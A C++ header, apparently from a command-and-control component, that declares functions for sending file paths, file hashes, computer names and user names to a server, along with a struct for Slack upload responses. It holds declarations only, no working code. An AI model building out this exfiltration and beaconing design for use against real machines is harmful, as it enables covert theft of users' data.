#ifndef COMUNICATIONC2_H
#define COMUNICATIONC2_H

#include <string>
#include <windows.h>

// Function declarations
void SendDataToServer(const char* filePath, BYTE* fileHash, const char* ip,
    const char* computerName, const char* userName);
void ConnectToServer(const char* ip, const char* computerName, const char* userName);
std::string GetCurrentUTCTimestamp();
std::string GetFileName(const char* filePath);
std::string EscapeJson(const std::string& input);
std::wstring StringToWString(const std::string& str);
std::string WStringToString(const std::wstring& wstr);

// Structure for Slack upload response
struct SlackUploadResponse {
    std::string upload_url;
    std::string file_id;
};

#endif // COMUNICATIONC2_H